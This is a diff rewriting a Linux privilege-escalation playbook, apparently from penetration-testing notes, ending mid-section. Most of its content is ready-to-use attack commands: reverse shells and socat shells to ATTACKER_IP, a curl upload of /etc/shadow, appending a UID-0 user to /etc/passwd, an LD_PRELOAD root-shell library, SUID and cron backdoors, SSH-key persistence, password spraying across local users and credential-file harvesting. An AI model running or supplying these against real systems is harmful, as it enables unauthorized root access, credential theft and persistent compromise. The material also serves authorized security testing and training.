@@ -1,612 +1,440 @@
 # Linux Privilege Escalation Methodology
 
-Comprehensive reference for Linux privilege escalation techniques covering enumeration, credential harvesting, file permission abuse, SUID/capabilities/sudo exploitation, kernel exploits, and automated tooling.
+End-to-end Linux local privilege escalation playbook: situational awareness → automated triage → manual hunting → exploitation → root → post-exploitation. Grounded in current (2025-2026) tradecraft. For deep topic dives see the sibling files in this directory: `suid-sudo-gtfobins.md`, `cron-path-capabilities-nfs.md`, `kernel-and-cve-exploits.md`, `container-and-docker-escape.md`.
+
+> Golden rule of Linux privesc: **the box almost always already contains the vulnerability.** Enumerate exhaustively before reaching for kernel exploits. Kernel exploits are loud, can panic the box, and are the *last* resort on a real engagement.
 
 ---
 
-## Enumeration
+## 0. The Mental Model
 
-### User and System Information
+Privesc on Linux comes from a small number of root-trust boundaries that are misconfigured:
+
+| Trust boundary | What you abuse | Examples |
+|----------------|----------------|----------|
+| **Setuid/setgid bit** | A binary runs as its owner (root) | SUID `find`, custom SUID wrappers |
+| **sudo policy** | `sudoers` grants you a root command | `NOPASSWD` GTFOBin, `env_keep`, `sudoedit` |
+| **Capabilities** | Fine-grained root powers on a file | `cap_setuid`, `cap_dac_read_search` |
+| **Scheduled execution** | root runs a file you control | cron, systemd timers, anacron |
+| **Writable root-owned path** | root reads/executes attacker-controlled data | `/etc/passwd`, `$PATH` hijack, writable service unit |
+| **Shared object loading** | root process loads your `.so` | `LD_PRELOAD`, `RPATH`, wildcard injection |
+| **Credentials at rest** | Reusing creds for a higher principal | history, configs, keys, DB creds, `.kdbx` |
+| **Kernel / setuid-root daemon CVE** | Memory-safety / logic bug | PwnKit, Dirty Pipe, GameOver(lay), CVE-2024-1086, CVE-2025-6019 |
+| **Container boundary** | Escape to host root | privileged container, mounted docker.sock, host PID/mounts |
+
+Every section below maps back to one of these boundaries.
+
+---
+
+## 1. Stabilize Your Shell First
+
+Before enumerating, upgrade from a dumb reverse shell to a real PTY — tab-completion, arrow keys, and `sudo` prompts all break without it.
+
 ```bash
-id
-whoami
-hostname
-cat /etc/passwd
-cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
-sudo -l
-cat /etc/issue
-cat /etc/os-release
-uname -a
-uname -r
-arch
+# Python PTY (most common)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# OR if python3 missing:
+python -c 'import pty; pty.spawn("/bin/bash")'; script -qc /bin/bash /dev/null
+
+# Then background and fix the terminal:
+# Ctrl+Z
+stty raw -echo; fg            # run on YOUR box
+export TERM=xterm-256color
+export SHELL=/bin/bash
+stty rows 50 cols 200         # match your terminal (run `stty size` locally)
 ```
 
-### Running Processes
+Other PTY spawners when python is absent:
+
 ```bash
-ps aux
-ps aux | grep root
-ps u -C <process_name>
-watch -n 1 "ps aux | grep pass"
-cat /proc/<PID>/status
-grep Uid /proc/<PID>/status
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/bash";'
+echo 'os.system("/bin/bash")' | python3
+expect -c 'spawn /bin/bash; interact'
+# socat (full PTY, best experience) — on attacker:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# on target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
 ```
 
-### Network Information
+---
+
+## 2. Automated Triage
+
+Run an automated scanner first to get fast coverage, then verify findings by hand. Do not blindly trust the output — confirm each "high" before acting.
+
+### LinPEAS (primary)
 ```bash
-ip a
-ifconfig -a
-route
-routel
-ip route
-ss -anp
-netstat -anp
-ss -tulpn
-cat /etc/iptables/rules.v4
-iptables -L -n -v
+# Download on attacker, serve, pull to target (avoid touching disk if possible)
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# Run directly from memory (no file on disk — good OPSEC):
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Full run with color preserved into a log, then read offline:
+./linpeas.sh -a 2>&1 | tee /dev/shm/lp.txt
+
+# Targeted/quiet modules (faster, quieter):
+./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocws,Net,UsrI,SofI,IntFiles
+```
+LinPEAS colour legend: **Red/Yellow background = 95%+ a privesc vector**, Red text = of interest. Grep the log for `RED` / `99%`.
+
+### Other scanners
+```bash
+# linux-smart-enumeration (lse) — tiered verbosity, cleaner output than LinPEAS
+curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash -s -- -l1
+
+# LinEnum
+./LinEnum.sh -t -k password -r report
+
+# Kernel/exploit suggesters
+./linux-exploit-suggester.sh                       # mzet, the standard
+./linux-exploit-suggester-2.pl
+linpeas.sh                                          # also flags kernel CVEs
+
+# pspy — watch cron/root processes WITHOUT root (huge for catching cron + masked creds)
+curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /dev/shm/pspy
+chmod +x /dev/shm/pspy && /dev/shm/pspy -pf -i 1000
 ```
 
-### Scheduled Tasks (Cron Jobs)
+> `pspy` is the single highest-value manual tool: it shows full command lines (including passwords passed as args) and short-lived cron jobs that `crontab -l` will never reveal.
+
+---
+
+## 3. Manual Enumeration Checklist
+
+### 3.1 Identity & sudo (always first, by hand)
 ```bash
-ls -lah /etc/cron*
-cat /etc/crontab
-crontab -l
-sudo crontab -l
-grep "CRON" /var/log/syslog
-cat /var/log/cron.log
+id; whoami; groups
+sudo -l                         # THE most important command — what can you run as root?
+sudo -l -l                      # verbose form (shows env_keep, secure_path)
+sudo -V | head -1               # sudo version → check for sudo CVEs (see §7)
+cat /etc/sudoers 2>/dev/null; ls -la /etc/sudoers.d/
+```
+Interesting `id` groups: `sudo`, `wheel`, `admin`, `docker`, `lxd`/`lxc`, `disk`, `adm`, `video`, `shadow`, `kvm`, `libvirt` — several grant trivial root (see §8 and the GTFOBins file).
+
+### 3.2 System & kernel
+```bash
+uname -a; cat /proc/version; arch
+cat /etc/os-release; cat /etc/issue; lsb_release -a 2>/dev/null
+hostnamectl
 ```
 
-### Installed Software
+### 3.3 Users, processes, and what runs as root
 ```bash
-dpkg -l                    # Debian/Ubuntu
-rpm -qa                    # Red Hat/CentOS
-dpkg -l | grep <package>
+cat /etc/passwd; grep -vE 'nologin|false' /etc/passwd | cut -d: -f1
+ps auxww --sort=-%cpu | head -40
+ps auxww | grep -i root
+ps -eo user,pid,cmd | grep -iE 'pass|token|key|secret'   # creds in cmdline
+watch -n1 'ps -eo user,pid,cmd --sort=start_time | tail'  # poor-man's pspy
 ```
 
-### File System and Permissions
+### 3.4 Network & internal services
 ```bash
-# World-writable directories
-find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-
-# World-writable files
-find / -writable -type f 2>/dev/null
-find / -perm -o w -type f 2>/dev/null
-
-# SUID binaries
-find / -perm -u=s -type f 2>/dev/null
-find / -perm -4000 2>/dev/null
-
-# SGID binaries
-find / -perm -g=s -type f 2>/dev/null
-find / -perm -2000 2>/dev/null
-
-# Files owned by root with SUID
-find / -user root -perm -4000 2>/dev/null
-
-# Check shadow/passwd permissions
-ls -la /etc/shadow
-ls -la /etc/passwd
+ss -tulpn; netstat -tulpn 2>/dev/null
+ss -tnp | grep ESTAB
+ip a; ip route
+cat /etc/hosts; cat /etc/resolv.conf
+# Loopback-only services are gold — pivot/forward them (e.g. mysql, redis, internal admin)
+curl -s 127.0.0.1:PORT
 ```
 
-### Mounted File Systems
+### 3.5 Filesystem permission sweeps
 ```bash
-mount
-cat /etc/fstab
-lsblk
-fdisk -l
-```
+# SUID / SGID
+find / -perm -4000 -type f 2>/dev/null              # SUID
+find / -perm -2000 -type f 2>/dev/null              # SGID
+find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
 
-### Kernel Modules
-```bash
-lsmod
-/sbin/modinfo <module_name>
-```
-
-### Capabilities
-```bash
+# Capabilities (often missed)
 getcap -r / 2>/dev/null
 /usr/sbin/getcap -r / 2>/dev/null
+
+# World-writable files & dirs (potential hijack of root-run scripts)
+find / -writable -type f -not -path "/proc/*" 2>/dev/null
+find / -perm -0002 -type f -not -path "/proc/*" 2>/dev/null
+find / -writable -type d 2>/dev/null
+
+# Files writable by your groups
+find / -group $(id -gn) -writable 2>/dev/null
+
+# Sensitive file perms
+ls -la /etc/passwd /etc/shadow /etc/sudoers
+find / -name "id_rsa*" -o -name "*.pem" -o -name "*.key" 2>/dev/null
 ```
 
-### Environment Variables
+### 3.6 Scheduled tasks (cron, timers, anacron)
 ```bash
-env
-printenv
-echo $PATH
-echo $HOME
+ls -la /etc/cron* /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
+cat /etc/crontab; crontab -l; sudo crontab -l 2>/dev/null
+grep -RIn "" /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
+systemctl list-timers --all
+grep CRON /var/log/syslog /var/log/cron* 2>/dev/null
+# Use pspy to catch hidden/short cron jobs!
 ```
 
----
-
-## Exposed Confidential Information
-
-### User History and Config Files
+### 3.7 NFS / mounts / fstab
 ```bash
-cat ~/.bash_history
-cat /home/*/.bash_history
-cat ~/.zsh_history
-cat ~/.mysql_history
-cat ~/.psql_history
-cat ~/.bashrc
-cat ~/.profile
-cat ~/.bash_profile
-
-# SSH keys
-ls -la ~/.ssh/
-cat ~/.ssh/id_rsa
-cat ~/.ssh/authorized_keys
-
-# Credentials in environment
-env | grep -i pass
-env | grep -i key
-env | grep -i secret
-```
-
-### Service Configuration Files
-```bash
-cat /etc/apache2/apache2.conf
-cat /etc/nginx/nginx.conf
-cat /var/www/html/config.php
-cat /etc/mysql/my.cnf
-cat /var/www/html/wp-config.php
-find / -name "*.conf" 2>/dev/null | xargs grep -i "pass\|key\|secret" 2>/dev/null
-find / -name "config.*" 2>/dev/null
-```
-
-### Password Sniffing
-```bash
-sudo tcpdump -i lo -A | grep "pass"
-sudo tcpdump -i any -A | grep -i "password\|user"
-```
-
-### Memory and Process Inspection
-```bash
-gdb -p <PID>
-(gdb) generate-core-file
-(gdb) quit
-strings core.<PID> | grep -i pass
+mount; cat /etc/fstab; cat /proc/mounts
+cat /etc/exports 2>/dev/null; showmount -e <host> 2>/dev/null
+# no_root_squash export => mount it and drop a SUID root binary (see cron-path-capabilities-nfs.md)
 ```
 
 ---
 
-## Insecure File Permissions
+## 4. Credential Hunting (often the fastest path)
 
-### Writable /etc/passwd
+Reusing a found password/key for a higher-privileged account beats any exploit. Hunt relentlessly.
+
 ```bash
-# Generate password hash
-openssl passwd <password>
-openssl passwd -1 -salt xyz <password>
+# Shell / tool histories
+cat ~/.bash_history /home/*/.bash_history 2>/dev/null
+cat ~/.*_history; cat ~/.zsh_history ~/.mysql_history ~/.psql_history 2>/dev/null
 
-# Add new root user
-echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
-su root2
+# SSH material (private keys, known_hosts for lateral pivot targets)
+find / -name "id_*" -o -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
+cat ~/.ssh/* /home/*/.ssh/* 2>/dev/null
+
+# Config files holding secrets (recursive grep is high yield)
+grep -RiIn --include=*.{php,py,js,env,ini,conf,cnf,yml,yaml,xml,json,sh} \
+  -E 'password|passwd|secret|api[_-]?key|token|aws_|connectionstring' \
+  /var/www /opt /home /etc /srv 2>/dev/null | head -80
+
+# Common targets
+cat /var/www/html/{config.php,wp-config.php} 2>/dev/null
+cat /etc/{mysql/my.cnf,nginx/nginx.conf,apache2/apache2.conf} 2>/dev/null
+cat ~/.aws/credentials ~/.config/gcloud/* ~/.docker/config.json 2>/dev/null
+cat /etc/fstab | grep -i "password\|credentials"      # CIFS creds files
+cat /opt/*/.env /var/www/**/.env 2>/dev/null
+
+# Database creds in memory / on disk
+mysql -u root            # try blank/weak
+redis-cli                # often unauth on loopback
+
+# Memory scraping for creds (if you can read process memory)
+strings /proc/*/environ 2>/dev/null | grep -iE 'pass|key|token'
+# Browser/keyring/keepass
+find / -name "*.kdbx" -o -name "Login Data" 2>/dev/null
+```
+
+After finding any password, **spray it across every local user**:
+```bash
+for u in $(cut -d: -f1 /etc/passwd); do echo "$PASSWORD" | timeout 2 su - "$u" -c 'id' 2>/dev/null && echo "[+] $u"; done
+```
+
+---
+
+## 5. Writable-File Abuse (no exploit needed)
+
+### Writable /etc/passwd (no shadow consultation if a hash is present inline)
+```bash
+openssl passwd -6 'Passw0rd!'      # or: -1 (md5), -5 (sha256)
+# append a UID-0 user with the hash inline:
+echo 'r00t:$6$xyz$HASH...:0:0:root:/root:/bin/bash' >> /etc/passwd
+su r00t                            # password: Passw0rd!
+# Or blank-password root if you can edit existing root line's 2nd field to ""
 ```
 
 ### Writable /etc/shadow
 ```bash
-mkpasswd -m sha-512 <password>
-# Replace root hash in /etc/shadow, then: su root
+mkpasswd -m sha-512 'Passw0rd!'    # generate, paste into root's shadow field
+su root
 ```
 
-### Writable Cron Jobs
+### Writable cron script / cron dir
 ```bash
-ls -la /etc/cron*
-find /etc/cron* -type f -writable
-
-# Add reverse shell to writable cron script
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/cron/script.sh
-
-# Named pipe variant
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f' >> script.sh
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/root_cron_script.sh
+# wait for cron, then:
+/tmp/rootbash -p
 ```
 
-### Writable Service Files
+### Writable systemd unit / service binary
 ```bash
-find /etc/systemd/system -writable -type f
-
-# Modify service to execute payload
+find /etc/systemd/ /lib/systemd/ -writable -type f 2>/dev/null
+# Edit ExecStart, then if you can trigger a restart (or wait for reboot):
 # [Service]
-# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
+# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
+systemctl daemon-reload 2>/dev/null; systemctl restart <svc> 2>/dev/null
 ```
 
-### Writable Scripts in PATH
+### $PATH hijack (root script calls a binary by relative/bare name)
 ```bash
 echo $PATH
-echo $PATH | tr ':' '\n' | xargs ls -ld
-
-echo '#!/bin/bash' > /writable/path/command
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /writable/path/command
-chmod +x /writable/path/command
+# If a root cron/SUID program calls e.g. `service` without full path and a writable dir precedes /usr/bin:
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /writable_in_path/service
+chmod +x /writable_in_path/service
 ```
 
 ---
 
-## SUID Binary Exploitation
+## 6. SUID / SGID / Capabilities / sudo (GTFOBins)
 
-### Find SUID Binaries
+These are the bread-and-butter vectors. Full command catalog in **`suid-sudo-gtfobins.md`** and **`cron-path-capabilities-nfs.md`**. Quick triage:
+
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+# Anything non-standard from the SUID list? Cross-reference GTFOBins.
 find / -perm -4000 -type f 2>/dev/null
-```
-
-### Common SUID Exploits
-
-**find**
-```bash
-find /home -exec /bin/bash -p \;
-find . -exec /bin/sh -p \; -quit
-```
-
-**vim**
-```bash
-vim -c ':!/bin/sh'
-```
-
-**bash**
-```bash
-bash -p
-```
-
-**less/more**
-```bash
-less /etc/passwd
-!/bin/sh
-```
-
-**nano**
-```bash
-nano
-# Ctrl+R, Ctrl+X
-reset; sh 1>&0 2>&0
-```
-
-**cp**
-```bash
-cp /etc/passwd /tmp/passwd
-echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd
-cp /tmp/passwd /etc/passwd
-```
-
-**awk**
-```bash
-awk 'BEGIN {system("/bin/sh")}'
-```
-
-**python/perl/ruby/lua**
-```bash
-python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-perl -e 'exec "/bin/sh";'
-ruby -e 'exec "/bin/sh"'
-lua -e 'os.execute("/bin/sh")'
-```
-
-**tar**
-```bash
-tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-```
-
-**zip**
-```bash
-zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
-```
-
-**git**
-```bash
-git help status
-!/bin/sh
-```
-
-**nmap (older versions)**
-```bash
-nmap --interactive
-!sh
-```
-
-> Reference: https://gtfobins.github.io/ for the full list of exploitable binaries.
-
----
-
-## Capabilities Exploitation
-
-### Find Capabilities
-```bash
-getcap -r / 2>/dev/null
-```
-
-### cap_setuid (python/perl/ruby)
-```bash
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
-perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
-```
-
-### cap_dac_read_search (tar)
-```bash
-tar cvf shadow.tar /etc/shadow
-tar -xvf shadow.tar
-cat etc/shadow
-```
-
-### cap_chown (python)
-```bash
-python -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
-```
-
----
-
-## Sudo Abuse
-
-### Check Sudo Permissions
-```bash
+# Capabilities granting root power:
+getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_read_search|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_chown'
+# sudo:
 sudo -l
 ```
 
-### Common Sudo Exploits
-
-**Full sudo access**
+Highest-signal sudo/SUID GTFOBins (full set in the dedicated file):
 ```bash
-sudo su
-sudo -i
-sudo /bin/bash
-```
-
-**NOPASSWD entries**
-```bash
-# If: (ALL) NOPASSWD: /usr/bin/find
-sudo find /home -exec /bin/bash \;
-```
-
-**LD_PRELOAD**
-```c
-// shell.c
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setuid(0);
-    setgid(0);
-    system("/bin/bash -p");
-}
-```
-```bash
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
-```
-
-**LD_LIBRARY_PATH**
-```bash
-ldd /usr/bin/apache2
-gcc -fPIC -shared -o libcrypt.so.1 shell.c
-sudo LD_LIBRARY_PATH=/tmp apache2
-```
-
-**Common sudo command exploits (GTFOBins)**
-```bash
+# SUID
+./find . -exec /bin/sh -p \; -quit
+./bash -p
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # via cap_setuid binary
+# sudo (NOPASSWD examples)
 sudo vim -c ':!/bin/sh'
-sudo less /etc/hosts        # then !/bin/sh
-sudo awk 'BEGIN {system("/bin/sh")}'
-sudo find /home -exec /bin/bash \;
-sudo man man                 # then !/bin/sh
-sudo git -p help             # then !/bin/sh
-sudo ftp                     # then !/bin/sh
-sudo apt-get changelog apt   # then !/bin/sh
-
-# Docker
-sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
-# Nmap
-echo "os.execute('/bin/sh')" > /tmp/shell.nse
-sudo nmap --script=/tmp/shell.nse
-
-# Systemctl
-TF=$(mktemp).service
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c "chmod +s /bin/bash"
-[Install]
-WantedBy=multi-user.target' > $TF
-sudo systemctl link $TF
-sudo systemctl enable --now $TF
-/bin/bash -p
-
-# tcpdump
-COMMAND='id'
-TF=$(mktemp)
-echo "$COMMAND" > $TF
-chmod +x $TF
-sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+sudo env /bin/sh
+sudo awk 'BEGIN{system("/bin/sh")}'
+sudo less /etc/profile        # then !/bin/sh
+sudo install -m =xs $(which bash) .   # copy SUID bash
 ```
 
-### AppArmor Bypass
+> Always check https://gtfobins.github.io/ for the *exact* binary and the right context (SUID vs sudo vs capability vs limited-shell escape).
+
+---
+
+## 7. Modern Kernel & setuid-root Daemon CVEs (2021-2025)
+
+Use only after enumeration is exhausted. Match kernel/distro precisely; test in a snapshot if possible.
+
+| CVE | Name | Affected | Notes |
+|-----|------|----------|-------|
+| CVE-2021-4034 | **PwnKit** (polkit `pkexec`) | nearly all distros since 2009 | Reliable, no kernel dep. Check `ls -l $(which pkexec)` is SUID. |
+| CVE-2021-3156 | **Baron Samedit** (sudo heap) | sudo < 1.9.5p2 | Check `sudo --version`. |
+| CVE-2022-0847 | **Dirty Pipe** | kernel 5.8 – 5.16.11 | Overwrite read-only files (e.g. `/etc/passwd`), hijack SUID. |
+| CVE-2021-3493 / CVE-2023-0386 | **OverlayFS** | Ubuntu / kernel ≤ 6.2 | GameOver(lay) widely weaponized on Ubuntu. |
+| CVE-2023-4911 | **Looney Tunables** (glibc `GLIBC_TUNABLES`) | glibc 2.34-2.38 (default Fedora/Ubuntu/Debian) | Local root via `ld.so`. |
+| CVE-2023-32233 | nf_tables UAF | kernel ≤ 6.3.1 | |
+| CVE-2024-1086 | **netfilter nf_tables UAF** | kernel 5.14 – 6.6 | Actively used by ransomware (CISA KEV, Oct 2025). Very reliable. |
+| CVE-2025-6018 + CVE-2025-6019 | **PAM + udisks/libblockdev chain** | openSUSE/SLE + Ubuntu/Debian/Fedora | Chains "allow_active" → root via `udisks`. Disclosed Qualys 2025. |
+
 ```bash
-aa-status
-sudo aa-complain /path/to/binary
-sudo systemctl stop apparmor
-sudo systemctl disable apparmor
+# Identify precisely before choosing
+uname -r; cat /etc/os-release; ldd --version | head -1; dpkg -l | grep -E 'polkit|sudo|glibc' 2>/dev/null
+searchsploit "linux kernel $(uname -r | cut -d- -f1)"
+# Compile statically when target libs are old:
+gcc -static exploit.c -o /dev/shm/x && /dev/shm/x
+gcc -m32 exploit.c -o x        # 32-bit if needed
+```
+
+Full per-CVE build/run notes live in **`kernel-and-cve-exploits.md`**.
+
+---
+
+## 8. Container & Docker / Group-Based Escapes
+
+If `id` shows `docker`, `lxd`, `lxc`, or `disk`, you likely already have root-equivalent. Full detail in **`container-and-docker-escape.md`**.
+
+```bash
+# docker group => instant root
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# lxd/lxc group => root via privileged container mounting host
+# (build alpine image, init with security.privileged=true, mount /)
+
+# Inside a container? Check for escape primitives:
+cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
+mount | grep -i docker.sock; ls -la /var/run/docker.sock   # mounted socket => host root
+capsh --print                                              # CAP_SYS_ADMIN etc.
+fdisk -l 2>/dev/null                                       # host disks visible => privileged
+
+# runC / container CVEs (2025): CVE-2025-31133, CVE-2024-21626 (leaky vessels) etc.
 ```
 
 ---
 
-## Kernel Exploits
+## 9. Reverse Shells & File Transfer (reference)
 
-### Enumeration
 ```bash
-uname -a
-uname -r
-cat /proc/version
-cat /etc/issue
-cat /etc/*-release
-lsb_release -a
-uname -m
-arch
-```
-
-### Search for Exploits
-```bash
-searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
-searchsploit linux kernel 4.4.0
-```
-
-### Notable Kernel Exploits
-
-| CVE | Name | Affected Versions |
-|-----|------|-------------------|
-| CVE-2016-5195 | Dirty COW | Kernel 2.6.22 - 3.9 |
-| CVE-2017-16995 | eBPF | Ubuntu 16.04, Kernel 4.4.0-116 |
-| CVE-2021-3493 | OverlayFS | Ubuntu 20.10, Kernel < 5.11 |
-| CVE-2021-4034 | PwnKit (Polkit) | All versions since 2009 |
-| CVE-2022-0847 | Dirty Pipe | Kernel 5.8 - 5.16.11 |
-| CVE-2022-2586 | nft_object UAF | Kernel 5.4 - 5.18.14 |
-
-### Compilation Tips
-```bash
-gcc exploit.c -o exploit
-gcc -m32 exploit.c -o exploit32    # 32-bit
-gcc -static exploit.c -o exploit   # Static (no dependencies)
-file exploit                       # Check architecture
-```
-
----
-
-## Automated Enumeration Tools
-
-### LinPEAS
-```bash
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh | tee linpeas_output.txt
-```
-
-### LinEnum
-```bash
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-chmod +x LinEnum.sh && ./LinEnum.sh
-```
-
-### Linux Exploit Suggester
-```bash
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
-```
-
-### unix-privesc-check
-```bash
-unix-privesc-check standard > output.txt
-unix-privesc-check detailed > output.txt
-```
-
-### pspy (Process Monitor Without Root)
-```bash
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
-chmod +x pspy64 && ./pspy64
-```
-
----
-
-## Reverse Shells
-
-### Bash
-```bash
+# Reverse shells
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
-```
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
+# Best modern listener on attacker:
+rlwrap -cAr nc -lvnp PORT     # readline-capable, then upgrade PTY (see §1)
 
-### Python
-```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
+# File transfer to target
+wget http://ATTACKER_IP/x -O /dev/shm/x; curl http://ATTACKER_IP/x -o /dev/shm/x
+# server: python3 -m http.server 80   (or `php -S 0.0.0.0:80`)
+# encoded inline when no egress:
+base64 -w0 file   # on attacker; then `echo BASE64 | base64 -d > file` on target
 
-### Netcat
-```bash
-nc -e /bin/sh ATTACKER_IP PORT
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
-```
-
-### Perl
-```bash
-perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-### PHP
-```bash
-php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-### Ruby
-```bash
-ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+# Exfil
+curl -F "f=@/etc/shadow" http://ATTACKER_IP/up    # with an upload server
 ```
 
 ---
 
-## Shell Upgrade
+## 10. Post-Exploitation as root
+
 ```bash
-# Python PTY
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Persistence options (engagement-scope permitting)
+cp /bin/bash /tmp/.rb; chmod +s /tmp/.rb            # SUID backdoor
+echo '* * * * * root cp /bin/bash /tmp/.rb;chmod +s /tmp/.rb' >> /etc/crontab
+mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys
 
-# Fully interactive shell
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Press Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm
-export SHELL=/bin/bash
-
-# Script command
-/usr/bin/script -qc /bin/bash /dev/null
+# Loot for lateral movement
+cat /etc/shadow                                      # crack offline (see 07-password-attacks)
+unshadow /etc/passwd /etc/shadow > /dev/shm/un.txt
+find / -name "id_rsa" 2>/dev/null                    # pivot keys
+cat /root/.bash_history /root/.ssh/known_hosts 2>/dev/null
+# Dump creds from running services (mysql, vault, k8s secrets, .kube/config)
 ```
 
 ---
 
-## Password Cracking
+## 11. Cheatsheet (copy-paste)
 
-### Unshadow and Crack
 ```bash
-unshadow passwd shadow > unshadowed.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-hashcat -m 1800 -a 0 unshadowed.txt /usr/share/wordlists/rockyou.txt
+# --- ONE-LINER TRIAGE ---
+id;sudo -l;uname -a;getcap -r / 2>/dev/null;find / -perm -4000 -type f 2>/dev/null
+
+# --- AUTO ---
+curl -L .../linpeas.sh | sh
+/dev/shm/pspy64 -pf -i 1000
+
+# --- SUDO/SUID WIN PATTERNS ---
+sudo -l                                  # then GTFOBins the allowed binary
+find . -exec /bin/sh -p \; -quit         # SUID find
+bash -p                                   # SUID bash
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # cap_setuid
+
+# --- WRITABLE PASSWD ---
+echo "r00t:$(openssl passwd -6 pwn):0:0::/root:/bin/bash" >> /etc/passwd && su r00t
+
+# --- CONTAINER ---
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# --- KERNEL (last resort) ---
+searchsploit linux kernel $(uname -r|cut -d- -f1)
+# PwnKit / Dirty Pipe / CVE-2024-1086 / Looney Tunables — match versions first
 ```
 
-### Brute Force SSH
-```bash
-hydra -l user -P wordlist.txt ssh://TARGET_IP -t 4
-medusa -h TARGET_IP -u user -P wordlist.txt -M ssh
-```
+### Decision flow
+1. Stabilize PTY → `id` / `sudo -l`.
+2. Run LinPEAS + pspy in parallel; hunt credentials by hand.
+3. sudo entry? → GTFOBins it. SUID/capability? → GTFOBins it.
+4. Writable cron/service/passwd/$PATH? → hijack it.
+5. NFS `no_root_squash`? → drop SUID binary.
+6. In a privileged/socket-mounted container? → escape to host.
+7. Nothing? → match exact kernel/sudo/polkit/glibc version → CVE exploit.
 
 ---
 
-## File Transfer
+## References
 
-### Download to Target
-```bash
-wget http://ATTACKER_IP/file
-curl http://ATTACKER_IP/file -o file
-echo "BASE64_STRING" | base64 -d > file
-```
-
-### Upload from Target
-```bash
